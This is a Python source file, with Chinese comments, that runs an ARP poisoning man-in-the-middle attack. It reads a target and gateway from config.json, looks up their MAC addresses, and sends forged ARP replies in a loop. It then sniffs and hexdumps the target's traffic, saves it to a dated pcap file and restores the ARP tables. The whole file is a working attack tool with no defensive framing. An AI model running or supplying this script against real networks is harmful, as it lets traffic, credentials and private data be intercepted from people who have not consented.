#!/usr/bin/python  
#coding=utf-8  
from scapy.all import *  
import os  
import sys  
import threading
import json  
import datetime


def display(packets):
    hexdump(packets)
    print ('\n')

def input_to_file(packets):
    #把抓到的pacp包放进data里
    if os.path.exists("data"):
        os.chdir("data")
        data_file = str(datetime.datetime.now())[:10] + 'arp.pcap'
        wrpcap(data_file,packets)
    else:
        os.mkdir(os.getcwd() + "\\data")
        os.chdir("data")
        data_file = str(datetime.datetime.now())[:10] + 'arp.pcap'
        wrpcap(data_file,packets)

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):  
    print ("[*] Restoring target... ")  
    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)  
    send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)    
    print ("[*] Restoring done... ")
    print ("[*] ARP poison attack finished. ")
  
def get_mac(ip_address):  
      
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)  
  
    #返回从响应数据中获取的Mac地址  
    for s,r in responses:  
        return r[Ether].src  
  
    return None  
  
def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):  
    global arp_is_on
    poison_target = ARP()  
    poison_target.op = 2  
    poison_target.psrc = gateway_ip  
    poison_target.pdst = target_ip  
    poison_target.hwdst = target_mac  
  
    poison_gateway = ARP()  
    poison_gateway.op = 2  
    poison_gateway.psrc = target_ip  
    poison_gateway.pdst = gateway_ip  
    poison_gateway.hwdst = gateway_mac  
  
    print ("[*] Beginning the ARP poison. [CTRL-C to stop]") 
    
    while arp_is_on:
        send(poison_target)
        send(poison_gateway)  
        time.sleep(2)

#查看配置文件
with open('config.json', 'rb') as f:
    config = json.load(f)
    target_ip = config["target_ip"] 
    gateway_ip = config["gateway_ip"]
    interface = config["interface"]
    print ("[*] Setting up %s " % interface)

    #分别发送arp包给主机和网关,获得他们的Mac地址
    gateway_mac = get_mac(gateway_ip)  
    if gateway_mac is None:  
        print ("[!!!] Failed to get gateway MAC.  Exiting. ")  
        sys.exit(0)  
    else:  
        print ("[*] Gateway %s is at %s" % (gateway_ip,gateway_mac))  
    target_mac = get_mac(target_ip)  
    if target_mac is None:  
        print ("[!!!] Failed to get target MAC.  Exiting. ")  
        sys.exit(0)  
    else:  
        print ("[*] Target %s is at %s" % (target_ip,target_mac)) 

# packet_count = 1000 注释掉就无限接收
# print ("[*] Starting sniffer for %d packets" % packet_count) 

if __name__ == "__main__":
    #启动ARP投毒攻击
    arp_is_on = 1  #arp开关
    poison_thread = threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac))  
    poison_thread.start() 
    #过滤数据包 只抓target_ip
    bpf_filter = "ip host %s" % target_ip  
    packets = sniff(filter=bpf_filter,iface=interface,prn=display)
    #将捕获到的数据包输出到文件
    input_to_file(packets)
    arp_is_on = 0
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)    
    sys.exit(0)